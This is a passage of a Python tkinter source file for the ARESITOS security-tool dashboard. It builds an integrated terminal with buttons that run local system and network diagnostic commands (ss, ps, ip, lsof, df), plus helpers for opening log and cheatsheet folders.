# -*- coding: utf-8 -*-
"""
ARESITOS - Vista Dashboard Optimizada
Dashboard para expertos en ciberseguridad con métricas específicas
Actualización cada 60 segundos para optimizar recursos
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import subprocess
import threading
import time
import platform
import os
import socket
from datetime import datetime
import logging
import queue
import io
import sys

try:
    from Aresitos.vista.burp_theme import burp_theme
    from Aresitos.utils.gestor_iconos import configurar_icono_ventana
    BURP_THEME_AVAILABLE = True
except ImportError:
    BURP_THEME_AVAILABLE = False
    burp_theme = None

class TerminalIntegradoHandler(logging.Handler):
    """Handler personalizado para mostrar logs en el terminal integrado."""
    
    def __init__(self, terminal_widget):
        super().__init__()
        self.terminal_widget = terminal_widget
        self.queue = queue.Queue()
        
    def emit(self, record):
        """Emitir log al terminal integrado."""
        try:
            mensaje = self.format(record)
            # Usar queue para thread-safety
            self.queue.put(mensaje)
            # Programar actualización en el hilo principal
            if self.terminal_widget:
                self.terminal_widget.after_idle(self._procesar_queue)
        except Exception:
            pass
    
    def _procesar_queue(self):
        """Procesar mensajes en queue y mostrarlos en el terminal."""
        try:
            while not self.queue.empty():
                mensaje = self.queue.get_nowait()
                if self.terminal_widget:
                    self.terminal_widget.insert(tk.END, f"{mensaje}\n")
                    self.terminal_widget.see(tk.END)
        except queue.Empty:
            pass
        except Exception:
            pass

class StreamRedirector:
    """Redirigir stdout/stderr al terminal integrado."""
    
    def __init__(self, terminal_widget, tipo="STDOUT"):
        self.terminal_widget = terminal_widget
        self.tipo = tipo
        
    def write(self, mensaje):
        """Escribir mensaje al terminal."""
        if mensaje.strip():
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                mensaje_formateado = f"[{timestamp}] {self.tipo}: {mensaje}"
                if self.terminal_widget:
                    self.terminal_widget.after_idle(
                        lambda: self._escribir_seguro(mensaje_formateado)
                    )
            except Exception:
                pass
    
    def _escribir_seguro(self, mensaje):
        """Escribir de forma segura en el widget."""
        try:
            if self.terminal_widget:
                self.terminal_widget.insert(tk.END, mensaje)
                self.terminal_widget.see(tk.END)
        except Exception:
            pass
    
    def flush(self):
        """Flush - requerido para interface de stream."""
        pass

class VistaDashboard(tk.Frame):
    """Dashboard optimizado para expertos en ciberseguridad con terminal integrado."""
    
    # Variable de clase para compartir el terminal entre todas las instancias
    _terminal_global = None
    _terminal_widget = None
    
    def __init__(self, parent):
        super().__init__(parent)
        self.controlador = None
        self.logger = logging.getLogger(__name__)
        self.actualizacion_activa = False
        self.shell_detectado = self._detectar_shell()
        
        # Variables para el terminal integrado
        self.terminal_handler = None
        self.stdout_redirector = None
        self.stderr_redirector = None
        self.original_stdout = sys.stdout
        self.original_stderr = sys.stderr
        
        # Configurar tema y colores
        if BURP_THEME_AVAILABLE and burp_theme:
            self.theme = burp_theme
            self.configure(bg=burp_theme.get_color('bg_primary'))
            # Configurar estilos TTK
            style = ttk.Style()
            burp_theme.configure_ttk_style(style)
            self.colors = {
                'bg_primary': burp_theme.get_color('bg_primary'),
                'bg_secondary': burp_theme.get_color('bg_secondary'), 
                'fg_primary': burp_theme.get_color('fg_primary'),
                'fg_secondary': burp_theme.get_color('fg_secondary'),
                'fg_accent': burp_theme.get_color('fg_accent'),
                'button_bg': burp_theme.get_color('button_bg'),
                'button_fg': burp_theme.get_color('button_fg')
            }
        else:
            self.theme = None
            self.colors = {
                'bg_primary': '#f0f0f0',
                'bg_secondary': '#ffffff',
                'fg_primary': '#000000',
                'fg_secondary': '#666666',
                'fg_accent': '#ff6633',
                'button_bg': '#007acc',
                'button_fg': '#ffffff'
            }
            self.configure(bg=self.colors['bg_primary'])
        
        self.crear_interfaz()
        self.iniciar_actualizacion_metricas()
        
    def configurar_logging_integrado(self):
        """Configurar el sistema de logging integrado después de crear la interfaz."""
        # Este método se llamará después de crear el terminal_output
        if hasattr(self, 'terminal_output'):
            # Configurar handler personalizado para logs
            self.terminal_handler = TerminalIntegradoHandler(self.terminal_output)
            self.terminal_handler.setLevel(logging.INFO)
            
            # Formato para los logs
            formatter = logging.Formatter(
                '[%(asctime)s] %(name)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
            self.terminal_handler.setFormatter(formatter)
            
            # Agregar handler al logger root para capturar todos los logs
            root_logger = logging.getLogger()
            root_logger.addHandler(self.terminal_handler)
            
            # Redirigir stdout y stderr
            self.stdout_redirector = StreamRedirector(self.terminal_output, "STDOUT")
            self.stderr_redirector = StreamRedirector(self.terminal_output, "STDERR")
            
            # Mensaje de inicio
            self.escribir_terminal("INICIANDO Sistema de logging integrado activado")
            self.escribir_terminal("LOG Todos los logs de ARESITOS se mostrarán aquí")
            self.escribir_terminal("="*60)
    
    def escribir_terminal(self, mensaje, prefijo="[ARESITOS]"):
        """Escribir mensaje directo al terminal integrado."""
        if hasattr(self, 'terminal_output') and self.terminal_output:
            timestamp = datetime.now().strftime("%H:%M:%S")
            mensaje_completo = f"[{timestamp}] {prefijo} {mensaje}\n"
            self._actualizar_terminal_seguro(mensaje_completo)
    
    def activar_captura_logs(self):
        """Activar captura de todos los logs del sistema."""
        try:
            # Redirigir stdout temporalmente para capturar prints
            sys.stdout = self.stdout_redirector
            sys.stderr = self.stderr_redirector
            self.escribir_terminal("OK Captura de logs activada")
        except Exception as e:
            print(f"Error activando captura: {e}")
    
    def desactivar_captura_logs(self):
        """Desactivar captura de logs."""
        try:
            sys.stdout = self.original_stdout
            sys.stderr = self.original_stderr
            if self.terminal_handler:
                logging.getLogger().removeHandler(self.terminal_handler)
            self.escribir_terminal("DETENIDO Captura de logs desactivada")
        except Exception as e:
            print(f"Error desactivando captura: {e}")
    
    def _detectar_shell(self):
        """Detectar el shell disponible en el sistema."""
        if platform.system() == "Windows":
            if os.path.exists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"):
                return "powershell"
            elif os.path.exists("C:\\Program Files\\PowerShell\\7\\pwsh.exe"):
                return "pwsh"
            else:
                return "cmd"
        else:
            return "bash"
    
    def set_controlador(self, controlador):
        """Establecer el controlador del dashboard."""
        self.controlador = controlador
        self.logger.info("Controlador establecido en VistaDashboard")
        
        # Obtener información del sistema a través del controlador si está disponible
        if self.controlador:
            try:
                # Intentar obtener información del sistema
                if hasattr(self.controlador, 'obtener_estado_sistema'):
                    estado_sistema = self.controlador.obtener_estado_sistema()
                    self.logger.info(f"Estado del sistema obtenido: {estado_sistema}")
                    
                if hasattr(self.controlador, 'obtener_metricas_dashboard'):
                    metricas = self.controlador.obtener_metricas_dashboard()
                    self.logger.info("Métricas del dashboard actualizadas")
                    
            except Exception as e:
                self.logger.error(f"Error obteniendo datos del controlador: {e}")
    
    def crear_interfaz(self):
        """Crear la interfaz principal del dashboard."""
        # Frame principal para el título
        titulo_frame = tk.Frame(self, bg=self.colors['bg_secondary'])
        titulo_frame.pack(fill="x", padx=10, pady=5)
        
        titulo_label = tk.Label(
            titulo_frame,
            text=" Dashboard de Ciberseguridad - Aresitos",
            font=("Arial", 16, "bold"),
            fg=self.colors['fg_accent'],
            bg=self.colors['bg_secondary']
        )
        titulo_label.pack()
        
        # Crear notebook para organizar las secciones
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=5)
        
        # ORDEN DE PESTAÑAS:
        # 1. Terminal integrado (PRIMERO)
        self.crear_pestana_terminal()
        
        # 2. Cheatsheets
        self.crear_pestana_chuletas()
        
        # 3. Información de red
        self.crear_pestana_red()
    
    def crear_pestana_red(self):
        """Crear pestaña de información de red."""
        red_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(red_frame, text="Información de Red")
        
        # Frame para IPs
        ip_frame = tk.LabelFrame(
            red_frame,
            text="Direcciones IP del Sistema",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        ip_frame.pack(fill="x", padx=10, pady=5)
        
        # IP Local (LAN)
        self.ip_local_label = tk.Label(
            ip_frame,
            text=" IP Local (LAN): Obteniendo...",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 11),
            anchor="w"
        )
        self.ip_local_label.pack(fill="x", padx=10, pady=5)
        
        # IP Pública (WAN)
        self.ip_publica_label = tk.Label(
            ip_frame,
            text=" IP Pública (WAN): Obteniendo...",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 11),
            anchor="w"
        )
        self.ip_publica_label.pack(fill="x", padx=10, pady=5)
        
        # Interfaces de red
        interfaces_frame = tk.LabelFrame(
            red_frame,
            text="Interfaces de Red Activas",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        interfaces_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Área de texto para interfaces
        self.interfaces_text = scrolledtext.ScrolledText(
            interfaces_frame,
            height=8,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 9),
            insertbackground=self.colors['fg_primary']
        )
        self.interfaces_text.pack(fill="both", expand=True, padx=10, pady=5)
    
    def crear_pestana_terminal(self):
        """Crear pestaña de terminal integrado con sistema de logging."""
        terminal_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(terminal_frame, text="Terminal ARESITOS")
        
        # Frame para controles del terminal
        controles_frame = tk.LabelFrame(
            terminal_frame,
            text="Terminal integrado de Aresitos",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        controles_frame.pack(fill="x", padx=10, pady=5)
        
        # Frame para botones de control
        botones_control_frame = tk.Frame(controles_frame, bg=self.colors['bg_secondary'])
        botones_control_frame.pack(fill="x", pady=5)
        
        # Botón para activar/desactivar captura de logs
        self.btn_toggle_logs = tk.Button(
            botones_control_frame,
            text="ACTIVAR CAPTURA LOGS",
            command=self.toggle_captura_logs,
            bg='#ff4444',
            fg='white',
            font=("Arial", 10, "bold"),
            height=2
        )
        self.btn_toggle_logs.pack(side="left", padx=5, fill="x", expand=True)
        
        # Botón para limpiar terminal
        btn_limpiar = tk.Button(
            botones_control_frame,
            text="🧹 LIMPIAR",
            command=self.limpiar_terminal,
            bg='#ffaa00',
            fg='white',
            font=("Arial", 10, "bold"),
            height=2
        )
        btn_limpiar.pack(side="left", padx=5, fill="x", expand=True)
        
        # Botón para abrir carpeta de logs
        btn_ver_logs = tk.Button(
            botones_control_frame,
            text="LOGS VER LOGS",
            command=self.abrir_carpeta_logs,
            bg='#007acc',
            fg='white',
            font=("Arial", 10, "bold"),
            height=2
        )
        btn_ver_logs.pack(side="left", padx=5, fill="x", expand=True)
        
        # Botón para abrir terminal externo
        btn_terminal_externo = tk.Button(
            botones_control_frame,
            text="TERMINAL KALI",
            command=self.abrir_terminal_kali,
            bg='#00ff00',
            fg='black',
            font=("Arial", 10, "bold"),
            height=2
        )
        btn_terminal_externo.pack(side="left", padx=5, fill="x", expand=True)
        
        # Frame para comandos rápidos
        comandos_frame = tk.LabelFrame(
            terminal_frame,
            text="COMANDOS Rápidos de Ciberseguridad",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        comandos_frame.pack(fill="x", padx=10, pady=5)
        
        # Frame específico para el grid de botones
        botones_grid_frame = tk.Frame(comandos_frame, bg=self.colors['bg_secondary'])
        botones_grid_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Botones de comandos rápidos optimizados para Kali Linux
        comandos_rapidos = [
            ("echo '=== CONEXIONES DE RED ACTIVAS ===' && echo && echo 'CONEXIONES TCP ESTABLECIDAS:' && ss -tuln 2>/dev/null | awk 'NR==1 {print; next} /ESTAB|LISTEN/ {printf \"%-8s %-12s %-25s %-25s\\n\", $1, $2, $5, $6}' | head -15 && echo && echo 'PUERTOS EN ESCUCHA:' && ss -tln 2>/dev/null | awk '/LISTEN/ {split($4,a,\":\"); printf \"Puerto %-6s en %s\\n\", a[length(a)], $4}' | head -10 && echo && echo '=== RESUMEN DETALLADO ===' && echo \"TCP Establecidas: $(ss -t 2>/dev/null | grep -c ESTAB)\" && echo \"TCP en Escucha: $(ss -tln 2>/dev/null | grep -c LISTEN)\" && echo \"UDP Activas: $(ss -u 2>/dev/null | grep -v State | wc -l)\" && echo \"Total Conexiones: $(ss -tuln 2>/dev/null | grep -v State | wc -l)\"", "Ver Conexiones de Red"),
            ("ps aux --sort=-%cpu | head -15", "Procesos que Más CPU Usan"),
            ("ip addr show", "Ver Interfaces de Red"),
            ("which nmap >/dev/null 2>&1 && echo 'Nmap disponible en Kali' && nmap --version | head -2 || echo 'Nmap no encontrado - verificar instalacion'", "Verificar Nmap Disponible"),
            ("df -h", "Ver Espacio en Disco"),
            ("free -h", "Ver Uso de Memoria"),
            ("whoami && id", "Ver Usuario y Permisos"),
            ("uname -a", "Información del Sistema"),
            ("echo '=== SERVICIOS EN ESCUCHA ===' && echo && ss -tlnp 2>/dev/null | awk 'BEGIN {print \"PUERTO  PROTOCOLO  DIRECCION             PROCESO\"; print \"================================================\"} /LISTEN/ {split($4,a,\":\"); puerto=a[length(a)]; split($7,b,\",\"); if(length(b)>1) {split(b[2],c,\"=\"); proceso=c[2]; if(length(proceso)>20) proceso=substr(proceso,1,20)\"...\"} else proceso=\"N/A\"; printf \"%-8s %-9s %-20s %s\\n\", puerto, $1, $4, proceso}' | head -20 && echo && echo '=== PUERTOS CRITICOS DETECTADOS ===' && ss -tlnp 2>/dev/null | grep -E ':(22|80|443|21|25|53|993|995|587|143|110|3389|5432|3306)' | awk '{split($4,a,\":\"); puerto=a[length(a)]; printf \"  Puerto %s (%s) en %s\\n\", puerto, $1, $4}' && echo && total_listen=$(ss -tlnp 2>/dev/null | grep -c LISTEN) && total_criticos=$(ss -tlnp 2>/dev/null | grep -cE ':(22|80|443|21|25|53|993|995|587|143|110|3389|5432|3306)') && echo \"Total servicios en escucha: $total_listen\" && echo \"Puertos criticos activos: $total_criticos\"", "Ver Servicios en Escucha"),
            ("echo '=== ARCHIVOS DE RED ABIERTOS ===' && echo && echo 'CONEXIONES POR PROCESO:' && if command -v lsof >/dev/null 2>&1; then echo 'Usando LSOF (información detallada):' && sudo lsof -i 2>/dev/null | awk 'NR==1 {print \"PROCESO    PID    USUARIO  PROTOCOLO  DIRECCION\"; print \"=============================================\"; next} NF>=8 {printf \"%-10s %-6s %-8s %-9s %s\\n\", $1, $2, $3, $5, $9}' | head -15; else echo 'LSOF no disponible - usando SS alternativo:'; fi && echo && echo 'ALTERNATIVO CON SS:' && ss -tulpn 2>/dev/null | awk 'NR==1 {print \"PROTOCOLO  ESTADO     DIRECCION_LOCAL      PROCESO\"; print \"===============================================\"; next} NF>=6 {split($7,a,\",\"); if(length(a)>1) {split(a[2],b,\"=\"); proceso=b[2]} else proceso=\"N/A\"; printf \"%-10s %-10s %-20s %s\\n\", $1, $2, $5, proceso}' | head -15 && echo && echo '=== RESUMEN ARCHIVOS DE RED ===' && echo \"Procesos con red: $(ss -tulpn 2>/dev/null | grep -v State | awk '{print $7}' | cut -d, -f2 | sort -u | wc -l)\" && echo \"Conexiones TCP: $(ss -t 2>/dev/null | grep -v State | wc -l)\" && echo \"Conexiones UDP: $(ss -u 2>/dev/null | grep -v State | wc -l)\"", "Ver Archivos de Red Abiertos"),
            ("arp -a 2>/dev/null || ip neigh show", "Ver Tabla ARP"),
            ("route -n 2>/dev/null || ip route show", "Ver Rutas de Red"),
            ("cat /proc/cpuinfo | grep 'model name' | head -1", "Información del Procesador"),
            ("lscpu | grep 'CPU(s)' || nproc", "Número de Núcleos CPU"),
            ("systemctl list-units --type=service --state=running | head -15", "Ver Servicios Activos")
        ]
        
        # Crear grid de botones
        for i, (comando, descripcion) in enumerate(comandos_rapidos):
            row = i // 3
            col = i % 3
            btn = tk.Button(
                botones_grid_frame,
                text=descripcion,
                command=lambda cmd=comando: self.ejecutar_comando_rapido(cmd),
                bg=self.colors['button_bg'],
                fg=self.colors['button_fg'],
                font=("Arial", 8),
                height=3,
                wraplength=150
            )
            btn.grid(row=row, column=col, padx=5, pady=5, sticky="ew")
        
        # Configurar columnas para que se expandan
        for i in range(3):
            botones_grid_frame.grid_columnconfigure(i, weight=1)
        
        # Área de salida del terminal (PRINCIPAL)
        output_frame = tk.LabelFrame(
            terminal_frame,
            text="Terminal ARESITOS - Logs y Comandos en Tiempo Real",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.terminal_output = scrolledtext.ScrolledText(
            output_frame,
            bg='#000000',  # Fondo negro como terminal
            fg='#00ff00',  # Texto verde como terminal
            font=("Consolas", 9),
            insertbackground='#00ff00',
            selectbackground='#333333'
        )
        self.terminal_output.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Frame para entrada de comandos (DEBAJO DEL TERMINAL)
        entrada_frame = tk.Frame(terminal_frame, bg=self.colors['bg_secondary'])
        entrada_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(entrada_frame, text="COMANDO:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left", padx=(0, 5))
        
        self.comando_entry = tk.Entry(
            entrada_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 10),
            insertbackground=self.colors['fg_primary']
        )
        self.comando_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        self.comando_entry.bind("<Return>", self.ejecutar_comando_entry)
        
        ejecutar_btn = tk.Button(
            entrada_frame,
            text="EJECUTAR",
            command=self.ejecutar_comando_entry,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=("Arial", 10, "bold")
        )
        ejecutar_btn.pack(side="right")
        
        # REGISTRAR TERMINAL GLOBAL PARA TODAS LAS VISTAS
        VistaDashboard._terminal_widget = self.terminal_output
        
        # Variable para controlar captura de logs
        self.captura_logs_activa = False
        
        # Mensaje inicial
        self._actualizar_terminal_seguro("="*80 + "\n")
        self._actualizar_terminal_seguro("Terminal integrado de Aresitos\n")
        self._actualizar_terminal_seguro(f"Iniciado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self._actualizar_terminal_seguro(f"Sistema: {platform.system()} {platform.release()}\n")
        self._actualizar_terminal_seguro(f"Shell: {self.shell_detectado}\n")
        self._actualizar_terminal_seguro("="*80 + "\n")
        self._actualizar_terminal_seguro("LOG Presiona 'ACTIVAR CAPTURA LOGS' para ver logs de ARESITOS aquí\n")
        self._actualizar_terminal_seguro("TIP Usa los comandos rápidos o escribe comandos personalizados\n\n")
        
        # Configurar logging integrado ahora que el widget existe
        self.configurar_logging_integrado()
    
    def toggle_captura_logs(self):
        """Alternar captura de logs."""
        if not self.captura_logs_activa:
            self.activar_captura_logs()
            self.captura_logs_activa = True
            self.btn_toggle_logs.config(
                text="ACTIVO CAPTURA ACTIVA",
                bg='#00aa00'
            )
            self.escribir_terminal("ACTIVAR CAPTURA DE LOGS ACTIVADA", "[SISTEMA]")
        else:
            self.desactivar_captura_logs()
            self.captura_logs_activa = False
            self.btn_toggle_logs.config(
                text="ACTIVAR CAPTURA LOGS", 
                bg='#ff4444'
            )
            self.escribir_terminal("ACTIVO CAPTURA DE LOGS DESACTIVADA", "[SISTEMA]")
    
    def limpiar_terminal(self):
        """Limpiar el contenido del terminal."""
        if hasattr(self, 'terminal_output'):
            self._actualizar_terminal_seguro("", "clear")
            # Mensaje de limpieza
            self._actualizar_terminal_seguro("="*80 + "\n")
            self._actualizar_terminal_seguro("🧹 TERMINAL LIMPIADO\n")
            self._actualizar_terminal_seguro(f" {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            self._actualizar_terminal_seguro("="*80 + "\n\n")
    
    def abrir_carpeta_logs(self):
        """Abrir carpeta de logs del escaneador en Kali Linux."""
        import os
        import subprocess
        
        try:
            # Rutas posibles de logs en orden de prioridad
            rutas_logs = [
                "logs/",  # Carpeta logs del proyecto
                "./logs/",
                os.path.expanduser("~/Ares/Aresitos/logs/"),
                "/var/log/aresitos/",
                "/tmp/aresitos_logs/"
            ]
            
            carpeta_encontrada = None
            for ruta in rutas_logs:
                if os.path.exists(ruta) and os.path.isdir(ruta):
                    carpeta_encontrada = os.path.abspath(ruta)
                    break
            
            if carpeta_encontrada:
                # Intentar abrir con gestor de archivos de Kali
                gestores_archivos = [
                    "thunar",           # XFCE (Kali predeterminado)
                    "nautilus",         # GNOME
                    "dolphin",          # KDE
                    "pcmanfm",          # LXDE
                    "caja",             # MATE
                    "nemo",             # Cinnamon
                    "xdg-open"          # Genérico
                ]
                
                for gestor in gestores_archivos:
                    try:
                        subprocess.run([gestor, carpeta_encontrada], 
                                     check=True, 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
                        self.escribir_terminal(f"OK Carpeta de logs abierta: {carpeta_encontrada}", "[LOGS]")
                        return
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        continue
                
                # Si no funcionó ningún gestor, mostrar ruta
                self.escribir_terminal(f"INFO Carpeta de logs: {carpeta_encontrada}", "[LOGS]")
                self.escribir_terminal("Use: cd " + carpeta_encontrada, "[COMANDO]")
                
            else:
                # Crear carpeta de logs si no existe
                logs_dir = "logs"
                os.makedirs(logs_dir, exist_ok=True)
                self.escribir_terminal(f"CREADO Carpeta de logs creada: {os.path.abspath(logs_dir)}", "[LOGS]")
                
                # Intentar abrirla
                try:
                    subprocess.run(["xdg-open", os.path.abspath(logs_dir)], 
                                 check=True, 
                                 stdout=subprocess.DEVNULL, 
                                 stderr=subprocess.DEVNULL)
                except:
                    self.escribir_terminal(f"INFO Acceda manualmente: {os.path.abspath(logs_dir)}", "[LOGS]")
                    
        except Exception as e:
            self.escribir_terminal(f"ERROR abriendo carpeta de logs: {e}", "[ERROR]")
    
    def abrir_carpeta_cheatsheets(self):
        """Abrir carpeta de cheatsheets en Kali Linux con optimizaciones nativas."""
        import os
        import subprocess
        import platform
        
        try:
            # Obtener directorio actual del proyecto
            directorio_proyecto = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            
            # Rutas de cheatsheets optimizadas para Kali Linux
            rutas_cheatsheets = [
                os.path.join(directorio_proyecto, "data", "cheatsheets"),  # Ruta relativa al proyecto
                "data/cheatsheets/",
                "./data/cheatsheets/",
                os.path.expanduser("~/Desktop/ARESITOS/data/cheatsheets/"),
                os.path.expanduser("~/Aresitos/data/cheatsheets/"),
                "/opt/aresitos/data/cheatsheets/",
                "/usr/share/aresitos/cheatsheets/"
            ]
            
            carpeta_encontrada = None
            for ruta in rutas_cheatsheets:
                ruta_abs = os.path.abspath(ruta)
                if os.path.exists(ruta_abs) and os.path.isdir(ruta_abs):
                    carpeta_encontrada = ruta_abs
                    break
            
            if carpeta_encontrada:
                # Verificar si estamos en Kali Linux
                is_kali = platform.system().lower() == 'linux'
                
                if is_kali:
                    # Comandos nativos de Kali Linux en orden de prioridad
                    comandos_kali = [
                        ["thunar", carpeta_encontrada],                    # XFCE (predeterminado Kali)
                        ["nautilus", carpeta_encontrada],                  # GNOME
                        ["dolphin", carpeta_encontrada],                   # KDE
                        ["pcmanfm", carpeta_encontrada],                   # LXDE
                        ["caja", carpeta_encontrada],                      # MATE
                        ["nemo", carpeta_encontrada],                      # Cinnamon
                        ["xdg-open", carpeta_encontrada]                   # Genérico Linux
                    ]
                    
                    for comando in comandos_kali:
                        try:
                            # Verificar si el comando existe
                            subprocess.run(["which", comando[0]], 
                                         check=True, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL)
                            
                            # Ejecutar el gestor de archivos
                            subprocess.Popen(comando, 
                                           stdout=subprocess.DEVNULL, 
                                           stderr=subprocess.DEVNULL)
                            
                            self.escribir_terminal(f"OK Cheatsheets abiertos con {comando[0]}: {carpeta_encontrada}", "[CHEATSHEETS]")
                            
                            # Mostrar contenido de la carpeta
                            try:
                                archivos = os.listdir(carpeta_encontrada)
                                cheatsheets = [f for f in archivos if f.endswith(('.txt', '.md'))]
                                if cheatsheets:
                                    self.escribir_terminal(f"INFO {len(cheatsheets)} cheatsheets disponibles (.txt/.md):", "[CHEATSHEETS]")
                                    for cs in sorted(cheatsheets)[:8]:  # Mostrar los primeros 8 ordenados
                                        extension = "NOTE" if cs.endswith('.txt') else "📄"
                                        self.escribir_terminal(f"   {extension} {cs}", "[CHEATSHEETS]")
                                    if len(cheatsheets) > 8:
                                        self.escribir_terminal(f"   ... y {len(cheatsheets)-8} cheatsheets más", "[CHEATSHEETS]")
                                    
                                    # Mostrar estadísticas
                                    txt_count = len([f for f in cheatsheets if f.endswith('.txt')])
                                    md_count = len([f for f in cheatsheets if f.endswith('.md')])
                                    self.escribir_terminal(f"   Tipos: {txt_count} archivos .txt, {md_count} archivos .md", "[CHEATSHEETS]")
                                    
                                    # Refrescar la lista de categorías de cheatsheets
                                    self.escribir_terminal("🔄 Actualizando lista de cheatsheets...", "[CHEATSHEETS]")
                                    self.cargar_categorias_cheatsheets()
                                else:
                                    self.escribir_terminal("INFO Carpeta encontrada pero sin cheatsheets .txt/.md", "[CHEATSHEETS]")
                                    # Mostrar qué archivos hay
                                    otros_archivos = [f for f in archivos if not f.startswith('.')][:5]
                                    if otros_archivos:
                                        self.escribir_terminal(f"   Archivos encontrados: {', '.join(otros_archivos)}", "[CHEATSHEETS]")
                                    
                                    # Refrescar la lista de categorías de cheatsheets incluso si está vacía
                                    self.escribir_terminal("🔄 Actualizando lista de cheatsheets...", "[CHEATSHEETS]")
                                    self.cargar_categorias_cheatsheets()
                            except Exception as e:
                                self.escribir_terminal(f"ERROR listando contenido: {str(e)}", "[CHEATSHEETS]")
                            
                            return
                            
                        except (subprocess.CalledProcessError, FileNotFoundError):
                            continue
                    
                    # Si no funcionó ningún gestor, mostrar información manual
                    self.escribir_terminal(f"INFO Cheatsheets en: {carpeta_encontrada}", "[CHEATSHEETS]")
                    self.escribir_terminal(f"CMD  cd {carpeta_encontrada}", "[COMANDO]")
                    self.escribir_terminal("CMD  ls -la", "[COMANDO]")
                    
                else:
                    # En modo desarrollo (Windows)
                    try:
                        import subprocess
                        subprocess.run(["explorer", carpeta_encontrada], check=True)
                        self.escribir_terminal(f"OK Cheatsheets abiertos (Windows): {carpeta_encontrada}", "[CHEATSHEETS]")
                    except:
                        self.escribir_terminal(f"INFO Cheatsheets en: {carpeta_encontrada}", "[CHEATSHEETS]")
                
            else:
                # Crear carpeta de cheatsheets si no existe
                cheatsheets_dir = os.path.join(directorio_proyecto, "data", "cheatsheets")
                os.makedirs(cheatsheets_dir, exist_ok=True)
                
                self.escribir_terminal(f"CREADO Carpeta cheatsheets: {cheatsheets_dir}", "[CHEATSHEETS]")
                self.escribir_terminal("INFO Puede copiar archivos .txt con comandos de seguridad", "[CHEATSHEETS]")
                self.escribir_terminal("EJEMPLO nmap_commands.txt, burpsuite_tips.txt, etc.", "[CHEATSHEETS]")
                
                # Intentar abrir la carpeta recién creada
                if platform.system().lower() == 'linux':
                    try:
                        subprocess.Popen(["thunar", cheatsheets_dir], 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL)
                    except:
                        self.escribir_terminal(f"CMD  cd {cheatsheets_dir}", "[COMANDO]")
                else:
                    try:
                        subprocess.run(["explorer", cheatsheets_dir], check=True)
                    except:
                        pass
                    
        except Exception as e:
            self.escribir_terminal(f"ERROR abriendo cheatsheets: {e}", "[ERROR]")
            self.escribir_terminal("SOLUCION Verifique que existe data/cheatsheets/", "[HELP]")
    
    def mostrar_cheatsheet(self, nombre_archivo=None):
        """Mostrar contenido de un cheatsheet específico en el terminal."""
        import os
        
        try:
            # Obtener directorio de cheatsheets
            directorio_proyecto = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
            cheatsheets_dir = os.path.join(directorio_proyecto, "data", "cheatsheets")
            
            if not os.path.exists(cheatsheets_dir):
                self.escribir_terminal("ERROR Carpeta de cheatsheets no encontrada", "[CHEATSHEETS]")
                return
            
            # Si no se especifica archivo, mostrar lista
            if not nombre_archivo:
                archivos = os.listdir(cheatsheets_dir)
                cheatsheets = [f for f in archivos if f.endswith(('.txt', '.md'))]
                
                if cheatsheets:
                    self.escribir_terminal("=== CHEATSHEETS DISPONIBLES ===", "[CHEATSHEETS]")
                    for i, cs in enumerate(sorted(cheatsheets), 1):
                        extension = "NOTE" if cs.endswith('.txt') else "📄"
                        self.escribir_terminal(f"{i:2d}. {extension} {cs}", "[CHEATSHEETS]")
                    self.escribir_terminal("\nUso: Click en 'Ver Cheat' o escriba nombre del archivo", "[HELP]")
                else:
                    self.escribir_terminal("INFO No hay cheatsheets disponibles", "[CHEATSHEETS]")
                return
            
            # Buscar archivo específico
            archivo_path = os.path.join(cheatsheets_dir, nombre_archivo)
            
            # Si no existe con el nombre exacto, buscar parcialmente
            if not os.path.exists(archivo_path):
                archivos = os.listdir(cheatsheets_dir)
                coincidencias = [f for f in archivos if nombre_archivo.lower() in f.lower() and f.endswith(('.txt', '.md'))]
                
                if len(coincidencias) == 1:
                    archivo_path = os.path.join(cheatsheets_dir, coincidencias[0])
                    nombre_archivo = coincidencias[0]
                elif len(coincidencias) > 1:
                    self.escribir_terminal(f"MÚLTIPLES ARCHIVOS encontrados para '{nombre_archivo}':", "[CHEATSHEETS]")
                    for cs in coincidencias:
                        self.escribir_terminal(f"  • {cs}", "[CHEATSHEETS]")
                    return
                else:
                    self.escribir_terminal(f"ERROR Cheatsheet '{nombre_archivo}' no encontrado", "[CHEATSHEETS]")
                    return
            
            # Leer y mostrar contenido
